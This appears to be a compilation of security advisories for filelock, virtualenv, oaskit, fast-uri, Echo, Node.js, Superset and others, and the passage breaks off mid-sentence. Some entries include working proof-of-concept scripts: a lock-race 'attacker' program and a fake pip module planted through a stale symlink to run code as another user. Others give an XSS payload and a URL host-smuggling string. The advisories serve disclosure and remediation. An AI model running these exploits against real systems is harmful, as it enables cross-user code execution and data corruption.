In versions 5.0.0 before 5.3.2 and 5.4.0 before 5.4.2, an authenticated user with only theme-file view permission can traverse outside the theme directory through the optional BcThemeFile plugin's Admin web screen. ThemeFilesController::parseArgs() constructs a path containing literal ../ segments, and the view and edit actions pass it to ThemeFilesService::get() without containment validation. Authorization checks the unresolved request path, after which ThemeFile::_getContents() reads the resolved file and exposes its contents in the form textarea. A client must preserve the dot segments rather than normalize them away. Readable files are limited to .php, .css, .js, and .ctp; this can disclose application source and config/install.php database credentials in MySQL or PostgreSQL deployments, while SQLite configurations have an empty database password. Reading config/app_local.php may expose the Security.salt fallback, which is effective only when not overridden by environment configuration. The flaw does not disclose .env, .pem, or SQLite .db files, does not itself permit file writes or code execution, and does not affect the separate API getFullpath() route. The plugin is disabled by default and unauthenticated requests are not sufficient. This issue has been patched in versions 5.3.2 and 5.4.2.

A flaw in Node.js HTTP Agent connection reuse can cause a client to accept as valid a response that was sent before the client has sent the request. This is an incomplete fix of CVE-2026-48931.

The guard that destroys idle keep-alive sockets when unexpected data arrives only runs when the event loop polls for I/O. If an unsolicited response has already reached the socket but has not been read yet when the socket is handed to a new request, for example because the event loop was busy with synchronous work, the guard is removed without seeing it and the data is parsed as the response to the new request.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

items.summary: Improper Neutralization of Input During Web Page Generation (XSS) vulnerability in lud oaskit allows reflected cross-site scripting via the default HTML error handler. The unescaped values are object keys taken from a request body or from an object or deepObject query parameter, which appear in the JSON Schema error's instance path when a schema rejects them (for example under additionalProperties: false), and the raw Content-Type header, reflected in unsupported-media-type errors when it fails to parse. Because browsers send Accept: text/html on ordinary top-level navigation, a crafted GET link is sufficient to trigger the error page; no form submission, custom Content-Type, or attacker-controlled script on the victim's side is required. A payload such as filter[]=x terminates the enclosing markup and the injected script executes in the origin of the application using oaskit, giving it access to that origin's cookies, session, and same-origin responses. Both HTML error rendering and the vulnerable handler are enabled by default: Oaskit.Plugs.ValidateRequest defaults :html_errors to true and :error_handler to Oaskit.ErrorHandler.Default, so applications following the documented usage are affected without any opt-in. items.summary:
`SoftFileLock` and `MarkerSoftFileLock` evict an unparsable marker (the lock file at `<path>`, whose presence says a process holds the lock) once a waiting contender has watched it unchanged for two seconds. `SoftFileLease` expires a lease the same way. The watch tells two looks apart by the marker's modification time (mtime) and inode number (the kernel's identity for a file, independent of its name) alone.

Another local user (the other user below) who can create files in the lock's directory, a sticky `/tmp` included (the sticky bit is a directory flag that lets only a file's owner remove it), parks an empty file of its own at the lock path. It dates that file to a future tick of the kernel's coarse clock (a clock that advances in steps of 4 ms), lets the waiters of the user running the lock (the lock user below) watch it past two seconds, and unlinks it in that tick. On a filesystem that hands a freed inode number straight back (ext4, overlayfs on ext4) the lock user's next marker repeats both values. It inherits the time spent watching the other user's file, and a second waiter removes it while its owner holds the lock.

Two of the lock user's processes then run the critical section together with no error. A `SoftFileLease` waiter takes a live lease that its owner wrote moments before, within milliseconds instead of after `lease_duration`. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding `ANT-2026-RKC48J5B`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N, 4.7 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): a race the other user cannot steer. It needs ext4-style inode reuse, a coarse-clock timestamp tick the other user can predict, and two polls of the lock user inside a 4 ms tick and a ~75 µs create-to-write gap. The scanner measured 2 to 10 % of attempts; none of our own 250 attempts fired. `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's processes act on their own. `C:N` (no confidentiality impact): the other user reads nothing. `I:H` (high integrity impact): two holders write the data the lock protects, and neither learns of the other. `A:N` (no availability impact): the lock keeps working.

Classification from the review: security, conditional, by mechanism. It is the same cross-UID primitive (a UID is a user account's numeric id) as the stale-break inode-reuse race reported in a separate advisory: an inode number reused after the other user's unlink in a sticky directory, which our review reproduced across UIDs, plus a forged future mtime. The scanner rated it high (CWE-694) and demonstrated it across UIDs in its own runs. It did not fire in 250 attempts of ours over ext4 with inode reuse confirmed, nor in the scanner-side triage, so its cross-user claim rests on the report's own runs and on the mechanism.

## Scope and preconditions

- The other user can create files in the lock's directory; a root-owned `1777` directory is enough. It creates, `utime`s (sets the timestamps of) and unlinks only its own file. In the sticky directory its `unlink`, `rename`, `open(..., "w")` and `utime` on a marker of the lock user all fail, and deleting its own file only frees the lock.
- The directory is on a filesystem that reuses a freed inode number at once: ext4, and overlayfs on it (thousands of create/unlink cycles returned one number). tmpfs does not reuse one, so the pair cannot repeat there; btrfs does not either.
- File timestamps come from a coarse clock whose future values the other user can compute (`CLOCK_REALTIME_COARSE`, 4 ms steps on Linux 6.1; 20,000 file creations all carried that clock's value).
- At least two processes of the lock user are waiting on the lock while the other user's file is there. The other user does not choose which processes overlap or when; each attempt blocks the lock for 2.2 s (for a lease, `lease_duration`).
- No symbolic link, hard link or FIFO takes part, so the `fs.protected_*` sysctls (Linux settings that restrict following links and opening pipes in sticky world-writable directories) play no part. `StrictSoftFileLock` keys its watch the same way but only raises `SoftFileLockProtocolError`, so it breaks no lock there.

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Affected code

At the scanned commit b831496, the watch is [`SoftFileLock._marker_unchanged_for`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L125-L132), with its caller in [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123). The [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256) paths hand an unparsable marker to the same code. The re-check in [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L113-L118) compares the values the contender just read.

## Introduced

0f7c4d3794dc ("fix(soft): expire leases on the contender's clock", #796, 2026-10-07), first released in 4.1.0 (verified against the tags). Earlier releases compared the marker's mtime with the wall clock, and this does not affect them.

## Mechanism

`SoftFileLock._acquire` creates the marker with `O_CREAT | O_EXCL` (create the file, fail if it exists) and only then writes the holder record. In between it calls `fstat` and `uname`, stats `/proc/self/ns/pid` and reads `/proc/<pid>/stat`, so for about 75 µs (measured) the marker exists and is empty. A contender that polls in that gap must not take the marker for garbage, and the check that protects it is the two-second watch. `_try_break_stale_lock` reads the marker, finds no holder, and calls `break_lock_file(lock_file, mtime, ino)` only if `_marker_unchanged_for(mtime, ino)` reaches `MALFORMED_LOCK_AGE_THRESHOLD` (2.0 s). That function keeps `self._marker_seen = ((mtime, ino), first seen)` across polls and returns the elapsed monotonic time (time from a clock that only moves forward) while the pair repeats.

Neither half of the pair belongs to one file. A file's owner sets its mtime to any value with `utime`, a future time included, and ext4 gives the inode number of an unlinked file to the next file created in the directory.

1. While the lock is free, the other user creates an empty file at the lock path (inode `I`) and sets its mtime to `T`, a tick of the coarse clock about 2.2 s in the future.
2. Every waiting process of the lock user polls each 50 ms, reads an empty file and records `_marker_seen = ((T, I), first seen)`. After 2 s each poll calls `break_lock_file`, whose `rename` fails with `EPERM` (operation not permitted; seen with `strace`): the directory is sticky and the file belongs to the other user. `suppress(OSError, ...)` swallows the error, the file stays, and nothing resets `_marker_seen`.
3. When the coarse clock reaches `T`, the other user unlinks its file. Inode `I` is free.
4. Process F of the lock user polls during tick `T`. Its `O_EXCL` create succeeds, and its marker is inode `I` with mtime `T`.
5. Process S polls before F has written its record. It reads an empty file with pair `(T, I)`, `_marker_unchanged_for` returns the 2.2 s that S spent watching the other user's file, and S calls `break_lock_file(lock_file, T, I)`.
6. `break_lock_file` compares mtime and inode before and after its rename, but with the values S just read from F's marker, so both checks pass. F's marker has S's UID, so the rename and the unlink succeed.
7. F writes its record into the unlinked inode and returns from `acquire()`. The path is empty, so the next contender to poll creates a marker and returns from `acquire()` too. F's release finds another inode at the path (`_unlink_open_marker`) and leaves it. Neither holder learns anything.

Step 4 needs a poll inside one 4 ms tick, and step 5 a second poll inside F's 75 µs gap. Step 5 is far likelier than independent 50 ms timers would make it, because contenders that wait together bunch. With filelock's DEBUG messages timestamped, nine waiters polled within 2 to 3 ms of one another, several 0.1 ms apart or closer. In a run where the other user also recorded what replaced its file, 13 of 100 successors appeared in tick `T`, and a waiter broke 7 of those 13.

`MarkerSoftFileLock` and `SoftFileLease` hand an unparsable marker to the same code, and the lease uses the clock a second time, for expiry: `if owner.mode == "lease" and self._marker_unchanged_for(mtime, ino) >= self._lease_duration: break_lock_file(...)`. `_marker_seen` is one attribute, so the same empty file primes this branch, and step 5 has no gap to hit. To every waiter, F's complete lease record with pair `(T, I)` has gone unrefreshed for `lease_duration`, until F's first heartbeat (the periodic refresh a lease holder runs). With the lock user's processes using `SoftFileLease(path, lease_duration=2)` and holding for 1 s, the same other user produced an overlap in 17 of 30 attempts. The superseded holder's `on_compromise` (the callback that tells a holder it lost the lock) reported `owner-changed` 0.67 s after it had entered, at its first heartbeat; a holder that releases before that is not told at all.

## Reproduction

The scanner's reproducer for finding `ANT-2026-RKC48J5B`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The `repro` script drives the files under `repro.d/`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import time

LOCK_DIR = "/tmp/locks"
LOCK_PATH = "/tmp/locks/app.lock"
HOLDS_LOG = "/tmp/holds.log"


def start_victims():
    # a root-owned sticky directory like /tmp, and ten processes of user victim taking turns on one lock in it
    shutil.rmtree(LOCK_DIR, ignore_errors=True)
    os.mkdir(LOCK_DIR)
    os.chmod(LOCK_DIR, 0o1777)
    victim = [sys.executable, "/tmp/repro.d/victim.py", LOCK_PATH]
    with open(HOLDS_LOG, "w") as holds_log:
        return [
            subprocess.Popen(victim, stdout=holds_log, user="victim", group="victim", extra_groups=[])
            for _ in range(10)
        ]


def holds_entered_after(moment):
    holds = []
    for line in open(HOLDS_LOG):
        fields = dict(field.split("=") for field in line.split())
        hold = {"entered": float(fields["entered"]), "exited": float(fields["exited"]), "line": line.strip()}
        if hold["entered"] > moment:
            holds.append(hold)
    return sorted(holds, key=lambda hold: hold["entered"])


def attack_until_overlap(phase, date_offset_s, max_attempts):
    victims = start_victims()
    attacker = [sys.executable, "/tmp/repro.d/attacker.py", LOCK_PATH, str(date_offset_s)]
    for attempt in range(1, max_attempts + 1):
        run = subprocess.run(attacker, stdout=subprocess.PIPE, text=True, check=True,
                             user="attacker", group="attacker", extra_groups=[])
        print(f"{phase} attempt {attempt}: {run.stdout.strip()}", flush=True)
        unlinked_at = float(run.stdout.split("unlinked_at=")[1])
        time.sleep(0.4)  # a hold lasts 0.3 s: whoever entered after the unlink has logged it by now

        # A hold entered within 1 ms of the unlink can also come from a separate flaw in break_lock_file (see the
        # report), so those are left out. time.monotonic() is one clock for every process on the machine.
        holds = holds_entered_after(unlinked_at + 0.001)
        overlaps = [(first, second) for first, second in zip(holds, holds[1:])
                    if second["entered"] < first["exited"]]
        if overlaps:
            break
    for victim in victims:
        victim.kill()
        victim.wait()
    return overlaps


# control: the attacker's file is dated an hour after the tick in which it is unlinked
control = attack_until_overlap("CONTROL", date_offset_s=3600, max_attempts=20)
# attack: the same file dated at that tick, i.e. with the mtime a victim's marker created in that tick gets
observed = attack_until_overlap("OBSERVED", date_offset_s=0, max_attempts=250)

# check: no two victims may ever be inside the lock at once
for phase, overlaps in [("CONTROL", control), ("OBSERVED", observed)]:
    print(f"{phase}: {len(overlaps)} time(s) two victims inside the lock at once")
    for first, second in overlaps:
        print(f"{phase}:   {first['line']}")
        print(f"{phase}:   {second['line']}")
print("BUG" if observed and not control else "OK")
```

**`repro.d/attacker.py`**

```python
#!/usr/bin/env python3
import os
import random
import sys
import time

lock_path, date_offset_s = sys.argv[1], int(sys.argv[2])

CLOCK_REALTIME_COARSE = 5  # <linux/time.h>; the kernel stamps new files from it, and it moves once per timer tick
tick_ns = round(time.clock_getres(CLOCK_REALTIME_COARSE) * 1e9)

# take the lock path the moment it is free, like any contender
while True:
    try:
        fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o644)
        break
    except FileExistsError:
        time.sleep(0.002)

# Left empty for longer than the 2 s filelock gives an unparsable marker. The victims poll every 50 ms: the random
# part makes some attempts free the path just before one of their polls.
park_s = random.uniform(2.2, 2.25)
release_tick = time.clock_gettime_ns(CLOCK_REALTIME_COARSE) + round(park_s * 1e9 / tick_ns) * tick_ns
mtime_ns = release_tick + date_offset_s * 10**9
os.utime(fd, ns=(mtime_ns, mtime_ns))
inode = os.fstat(fd).st_ino
os.close(fd)

time.sleep(park_s - 0.05)
while time.clock_gettime_ns(CLOCK_REALTIME_COARSE) < release_tick:
    pass
os.unlink(lock_path)  # a marker created before the next tick gets mtime == release_tick and, on ext4, this inode
unlinked_at = time.monotonic()
time.sleep(0.1)  # exiting right away keeps a CPU busy during the victims' polls, and overlaps get much rarer
print(f"inode={inode} mtime_ns={mtime_ns} unlinked_in_tick={release_tick} unlinked_at={unlinked_at}")
```

## Attack sequence

```mermaid
sequenceDiagram
    participant X as other local user
    participant P as lock path (sticky dir, ext4, 4 ms clock ticks)
    participant S as process S of the lock user (waiting)
    participant F as process F of the lock user
    X->>P: create empty file, inode I, utime to future tick T
    S->>P: poll: empty file, key (T, I), watch starts
    Note over S: after 2 s each poll calls break_lock_file, rename gets EPERM, error swallowed, watch keeps counting
    rect rgb(255, 214, 214)
        X->>P: at tick T: unlink own file, I is free
        F->>P: O_EXCL create in tick T: inode I, mtime T, record not yet written
        S->>P: poll: empty file, key (T, I) seen for 2.2 s: break_lock_file(T, I) renames and unlinks F's marker
        F->>P: writes record into the unlinked inode, acquire() returns
        Note over S,F: the path is empty, the next contender creates a marker: two holders, no error
    end
```

## Evidence

The scanner's reproducer runs ten copies of a default-option `SoftFileLock` program (0.3 s of work per hold, 50 ms between holds) as user `victim` in a root-owned `1777` directory on overlayfs over ext4 (Linux 6.1, CPython 3.14). A program running as user `attacker` waits until the lock path is free, creates an empty file there, dates it to a coarse-clock tick 2.2 to 2.25 s ahead, and unlinks it when `CLOCK_REALTIME_COARSE` reaches that tick. Control attempts date the file an hour after the unlink tick (20 attempts, 0 overlaps); the other attempts date it at that tick.

In four runs the overlap came after 9, 12, 27 and 20 attempts. Each showed the hold lines of two `victim` processes overlapping in time with `is_locked=True`, for example `pid=217 entered=241.295272609 exited=241.59542327` and `pid=216 entered=241.295518489 exited=241.595641553`. 40 of 650 attempts over seven runs ended this way, none with the file dated 4 ms earlier (100 attempts) or an hour later (150). A stepped run (one process stalled 0.2 s between creating its marker and writing its record, one waiting contender) deleted the fresh marker in 3 of 3 trials with the matching date and 0 of 5 with other dates.

Our review ran the reproducer over a loop-mounted ext4 `/tmp` (the host's btrfs does not hand a freed number back) with inode reuse confirmed (inode 18 reused on every attempt, `--cpus 2`). 0 of 250 attempts fired on 4.2.0 in 802 s, as in the scanner-side triage, and 0 of 250 on the head of #843, so our run gives no evidence either way. The review confirmed that `utime` cannot set the file's change time. The classification follows from the cross-UID inode-reuse primitive verified in the stale-break race of the separate advisory and from the report's own runs.

## Impact

A local user who can create a file in a soft lock's directory, a sticky directory such as `/tmp` included, gets two processes of another user to hold the same `SoftFileLock` at once (`MarkerSoftFileLock` too, by the shared code). Neither process learns of the overlap, so both modify the data the lock protects. The other user has no simpler way to get this: in the sticky directory its `unlink`, `rename`, `open(..., "w")` and `utime` on a marker of the lock user all fail, and deleting its own file only frees the lock. For `SoftFileLease` the effect is a live, refreshed claim taken after milliseconds instead of after `lease_duration` without a refresh. The holder learns of it one heartbeat later, or not at all if it releases first. Not affected: releases before 4.1.0, filesystems that do not reuse inode numbers at once (tmpfs, btrfs), and a lock with a single contender.

## Workarounds

Keep soft locks in a directory other users cannot create files in (a `0700` directory of the lock's user) rather than a shared sticky directory, or put the lock directory on tmpfs, which does not reuse inode numbers. Where the native `FileLock` works (local ext4 with `flock`), prefer it over `SoftFileLock`. Raise `poll_interval` so fewer waiters bunch inside one clock tick; this lowers the hit rate but does not close the window.

items.summary:
## Impact

Echo v5's BodyDump middleware captured a bounded prefix, drained the remaining request body while ignoring read errors, and then replaced the body with the captured prefix. With an outer BodyLimit, an unknown-length request such as an HTTP/1.1 chunked request, and a BodyDump capture limit below the BodyLimit threshold, an overflow detected during that drain could be discarded.

The handler could consequently process a truncated request and return success even though the original body exceeded the configured limit. This is a conditional size-policy bypass; no general authentication bypass, production data modification or denial of service is claimed. Known-length requests rejected before BodyDump runs are unaffected by this path.

## Affected versions and patch

All v5 releases from v5.0.0 through v5.4.0 contain the affected drain-and-replace logic. Runtime reproduction confirmed v5.4.0; source comparison confirms the same request handling in v5.0.0.

Upgrade to [v5.4.1](https://github.com/labstack/echo/releases/tag/v5.4.1). BodyDump now captures only the configured prefix for logging and reconstructs the handler's reader from that prefix plus the unread original stream. It preserves the original closer and read errors instead of silently draining the rest. [Fix commit](https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec).

Streaming BodyLimit enforcement still requires the application to consume the request body and handle read errors. The BodyDump capture cap is a logging cap, not an application body limit.

## Workarounds

Disable BodyDump on affected routes, or ensure the BodyLimit overflow is detected during the initial capture by setting the capture limit above the enforced body limit. Upgrading is recommended because it also preserves the complete body for handlers.

## Credits

Reported by @Duodum. The fix incorporates @jakezwang's request-body preservation work in [#3105](https://github.com/labstack/echo/pull/3105).

items.summary:
## Summary

The app-data seeder can leave an environment linked to temporary package files that virtualenv deletes when creation
finishes. The environment-variable and configuration-file forms of `symlink_app_data` can enable this state even though
the command-line flag is disabled for temporary app-data. The resulting environment depends on a cache pathname that its
owner no longer controls.

Anthropic's OSS Scanner reported this as `ANT-2026-ZOE2GEPC` in `virtualenv-20261015-005`, received on 15 October 2026.
This draft records source review and functional remediation checks. The reporter's cross-account code-execution claim
has not been independently reproduced.

## Affected area

Integrity of app-data references after temporary cache cleanup.

## Attacker-controlled input

Symlink seeding must be enabled through `VIRTUALENV_SYMLINK_APP_DATA` or `symlink_app_data` in the configuration file,
and app-data setup must fall back to a temporary directory. A missing or unwritable configured cache can cause that
fallback. Ordinary copy seeding does not leave these references.

The security concern requires a shared temporary-directory parent where another account can acquire the deleted cache
pathname, followed by use of the affected environment. That account need not already be able to modify the environment
or the private cache while it exists. This differs from the security policy's excluded case of an account that already
controls live app-data contents. On a platform with a temporary-directory parent private to the environment owner, that
cross-account condition is absent. Windows functional checks do not establish cross-account exposure under Windows
defaults.

## Affected code

The relevant 21.14.8 source is in
[symlink seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/via_app_data.py),
[temporary cache cleanup](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/app_data/via_tempdir.py).

## Mechanism

When app-data setup falls back to a temporary directory, the command-line `--symlink-app-data` action is disabled. A
value supplied by `VIRTUALENV_SYMLINK_APP_DATA` or `virtualenv.ini` can still become the parser default, and the seeder
constructor accepts that value without rechecking the cache lifetime. It links `site-packages/pip` into the temporary
cache. Session cleanup deletes that cache, leaving a dangling link whose pathname can later be claimed by another
account on a shared temporary filesystem.

## Reproduction and evidence

The scanner ran its reproduction as two unprivileged users, with root used only to switch identities. The environment
owner had an unwritable home, so app-data fell back to `/tmp`. The control used the command-line flag and received a
real pip directory. With `VIRTUALENV_SYMLINK_APP_DATA=1`, the new environment instead contained a `pip` link into a
deleted `/tmp/tmpXXXXXXXX` directory. A second uid recreated the target path and placed a fake `pip/__init__.py` there.
When the owner ran `venv/bin/pip --version`, that module created a marker inside the owner's environment and printed
`this is not pip`.

The cross-account path requires a shared temporary parent, a second account able to claim the deleted name, and later
use of the environment. A private temporary parent removes that route. The report traces the incomplete temporary-cache
guard to #1661, first released in 20.0.6.
[Public fix PR #3437](https://github.com/pypa/virtualenv/pull/3437) copies packages whenever app-data is
temporary, whatever supplied the symlink option. The implementation review checked the remediation; it did not rerun the
cross-account reproduction.

## Attack sequence

```mermaid
sequenceDiagram
    participant U as Environment owner
    participant V as virtualenv seeder
    participant T as Temporary app-data in /tmp
    participant E as site-packages/pip link
    participant A as Other local account
    U->>V: VIRTUALENV_SYMLINK_APP_DATA=1 with unwritable home
    V->>T: create transient cache
    V->>E: link pip to cache path
    V->>T: delete cache at session exit
    A->>T: reclaim old name and plant fake pip
    U->>E: run bin/pip --version
    E->>T: import fake pip through stale link
    T-->>U: attacker's code runs as owner
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-ZOE2GEPC`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import pwd
import shutil
import subprocess
from pathlib import Path

owner = pwd.getpwnam("nobody")  # home is /nonexistent: app-data cannot be created, so virtualenv uses a temporary one
other_user_uid = 4242
project = Path("/srv/project")
other_user_files = Path("/var/tmp/other-user")

# set up: a project folder only the owner can write, and the other user's two files in a folder of their own
shutil.rmtree(project, ignore_errors=True)
shutil.rmtree(other_user_files, ignore_errors=True)
project.mkdir(mode=0o755)
os.chown(project, owner.pw_uid, owner.pw_gid)
shutil.copytree("/tmp/repro.d", other_user_files)
subprocess.run(["chown", "-R", f"{other_user_uid}:{other_user_uid}", other_user_files], check=True)

as_owner = {"user": owner.pw_uid, "group": owner.pw_gid, "extra_groups": [], "cwd": project}
as_other_user = {"user": other_user_uid, "group": other_user_uid, "extra_groups": [], "cwd": "/"}
owner_env = {"HOME": owner.pw_dir, "PATH": os.environ["PATH"]}
virtualenv = ["virtualenv", "--quiet", "--no-periodic-update"]

# control: --symlink-app-data on the command line is dropped while app-data is temporary, so pip is copied
subprocess.run([*virtualenv, "--symlink-app-data", "control"], env=owner_env, check=True, **as_owner)
control_pip = next(project.glob("control/lib/python*/site-packages/pip"))
print(f"CONTROL  --symlink-app-data:            {control_pip} is a symlink: {control_pip.is_symlink()}")

# trigger: the same setting through the environment variable
symlink_env = {**owner_env, "VIRTUALENV_SYMLINK_APP_DATA": "1"}
subprocess.run([*virtualenv, "venv"], env=symlink_env, check=True, **as_owner)
venv_pip = next(project.glob("venv/lib/python*/site-packages/pip"))
print(f"OBSERVED VIRTUALENV_SYMLINK_APP_DATA=1: {venv_pip} is a symlink: {venv_pip.is_symlink()}")

# attack: the other user re-creates the deleted folder the link points into
if venv_pip.is_symlink():
    print(f"OBSERVED it points to {os.readlink(venv_pip)}, which exists: {venv_pip.exists()}")
    subprocess.run(["python3", other_user_files / "plant_fake_pip.py", venv_pip], check=True, **as_other_user)

# the owner uses their environment
pip_version = subprocess.run([project / "venv/bin/pip", "--version"], env=owner_env, capture_output=True, text=True, **as_owner)
print(f"OBSERVED venv/bin/pip --version, run by uid {owner.pw_uid}, printed: {(pip_version.stdout + pip_version.stderr).strip()}")

# check: fake_pip.py writes this file into the environment folder, which uid 4242 cannot write
venv_stat = os.stat(project / "venv")
print(f"OBSERVED {project / 'venv'} has mode {oct(venv_stat.st_mode & 0o777)} and owner uid {venv_stat.st_uid}")
proof = project / "venv/attacker-code-ran"
print(f"OBSERVED {proof} exists: {proof.exists()}")
if proof.exists():
    print(f"OBSERVED it is owned by uid {proof.stat().st_uid} and says: {proof.read_text()}")
print("BUG" if proof.exists() and proof.stat().st_uid == owner.pw_uid else "OK")
```

**`repro.d/fake_pip.py`**

```text
# planted as pip/__init__.py: runs in whichever process imports pip
import os
import sys

with open(os.path.join(sys.prefix, "attacker-code-ran"), "w") as proof:
    proof.write(f"{os.path.realpath(__file__)}, owned by uid {os.stat(__file__).st_uid}, was imported by uid {os.getuid()}")

sys.exit("this is not pip")
```

**`repro.d/plant_fake_pip.py`**

```text
import os
import shutil
import sys
from pathlib import Path

dangling_link = sys.argv[1]  # the environment is world-readable, so anyone can read where its links go
deleted_folder = Path(os.readlink(dangling_link))

# virtualenv deleted /tmp/tmpXXXXXXXX when it exited, so the name is free for anyone to take
deleted_folder.mkdir(parents=True)
shutil.copy(Path(__file__).with_name("fake_pip.py"), deleted_folder / "__init__.py")
```

## Impact

Seed packages become unavailable after temporary-cache cleanup. With a shared temporary-directory parent, a later
package load can follow the stale cache reference into a pathname another account has acquired. A private
temporary-directory parent prevents that cross-account condition.

Severity: low.

## Versions tested

The reproduced release is 21.14.8. The vulnerable seeder path is unchanged in 21.14.9. The affected range starts at
21.14.8, the first release confirmed here; earlier releases may also be affected. No fixed release is available.

The reporter identifies 20.0.6 as the first affected release. Commit
[c3453b6c](https://github.com/pypa/virtualenv/commit/c3453b6c381d28377c8e0115bf1124b2ca7b3c2b), first included in
20.0.6, contains the incomplete transient-cache guard. Historical runtime behavior across that range remains unverified.

The proposed fix copies seed packages whenever app-data is temporary, including when symlink seeding was selected
through environment variables or configuration. The environment then remains usable after cache cleanup.

Proposed fix: [PR #3437](https://github.com/pypa/virtualenv/pull/3437).

## Known mitigation

The proposed fix is in [public PR #3437](https://github.com/pypa/virtualenv/pull/3437).

The fix checks the selected app-data lifetime in the seeder constructor and always copies from temporary app-data,
regardless of where the symlink option came from. Persistent caches retain symlink seeding.

Until a fixed release is available, disable symlink seeding in configuration and environment variables, or provide a
writable persistent cache private to the environment owner. Recreate affected environments after correcting those
settings. No fixed release is available yet.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8. The same vulnerable code remains in 21.14.9.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-ZOE2GEPC.

items.summary:
A Regular Expression Denial of Service (ReDoS) vulnerability exists in Apache Superset versions 1.5.0 through 5.0.0. The vulnerability is located in the sql_parse.py component, specifically within the SQL_REGEX used for parsing SQL statements in the sqlparse library integration.
The affected regular expression contains overlapping disjunctions that share a common outer quantifier. An authenticated attacker can exploit this by sending a maliciously crafted input string (specifically a long sequence of backslashes or similar characters) to endpoints that process SQL queries

This issue affects Apache Superset: before 6.0.0.

Users are recommended to upgrade to version 6.0.0, which fixes the issue. 

Workarounds:
● WAF Rules: Implement Web Application Firewall (WAF) rules to detect and block
requests containing excessively long sequences of backslashes or suspicious repeated
patterns in the queries.extras.where parameter.
● Rate Limiting: Ensure strict rate limiting is applied to the /api/v1/chart/data endpoint to
reduce the impact of potential attacks.

items.summary:
### Impact
ACL checks ran on the lexical vault-relative path while containment used the realpath. An in-vault symlink placed under an allowed glob, whose realpath resolved into a denied folder, passed the read ACL — an intra-vault read-ACL-scope bypass. It requires an out-of-band-planted symlink (no MCP tool creates one) and is not a vault-root escape.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. ACL enforcement now derives the realpath vault-relative path and feeds a single unified predicate at every site.

### Workarounds
Do not permit untrusted symlinks inside the vault.

items.summary:
### Impact

`fast-uri` versions `>= 2.4.2, <= 2.4.7`, `>= 3.1.3, <= 3.1.8`, and `>= 4.0.1, <= 4.2.2` can silently rewrite the host of an HTTP-family URL (`http`, `https`, `ws`, `wss`, or any scheme with `domainHost: true`). For those schemes `canonicalizeHost()` passes the parsed host to the WHATWG `URL` parser and adopts its `.hostname` without checking that the parser read the whole input as a host. RFC 3986 permits `@` inside the host group and the WHATWG parser strips TAB, LF, and CR, so the authority `fast-uri` reports is rewritten by that second parser with no `error` set: data before an `@` is dropped and whitespace is removed.

For example, `fast-uri` parses `http://a@b@evil.example/` to host `evil.example` (dropping the `b` segment), and a host containing a raw TAB, CR, or LF has those characters stripped. `equal()` then treats a whitespace-smuggled host as the same as the clean one, and `resolve()` rewrites the authority the same way.

Applications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) on one representation, such as the raw input, see a policy/use desync: the canonical host `fast-uri` returns differs from what was checked, and traffic can be steered to an unintended destination.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Reject URIs whose authority contains more than one `@`, or contains TAB, CR, or LF, before calling `fast-uri`. Alternatively, treat any non-empty `parse(x).error` as fatal, and compare hosts only from the same `parse()` result.

items.summary:
## Summary

The app-data seeder joins paths from existing distribution metadata to site-packages and deletes the resulting paths
without checking containment within the environment.

Anthropic's OSS Scanner reported this as `ANT-2026-SXOEHWP7` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Removal of a previously installed seed package.

## Attacker-controlled input

An environment being reused must contain distribution metadata influenced by another account. The invoking user must
have deletion rights over the paths named by that metadata. Installing a new environment without existing package
metadata does not enter this cleanup path.

## Affected code

The relevant 21.14.8 source is in
[seed uninstall](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).

## Mechanism

Before reinstalling a seed wheel, `PipInstall._uninstall_previous_version()` accepts an existing `pip-*.dist-info`
directory in the destination. `_uninstall_dist()` reads its `top_level.txt` and `RECORD`, joins each entry to
`site-packages`, and deletes the result. It does not check whether `..`, an absolute entry, or a linked parent takes the
path outside the environment. The default app-data seeder reaches this path when it reuses a tree containing
seed-package metadata; `--clear` removes that tree first.

## Reproduction and evidence

The scanner prepared a project with `.venv/lib/python3.14/site-packages/pip-1.0.dist-info/`. Its `top_level.txt`
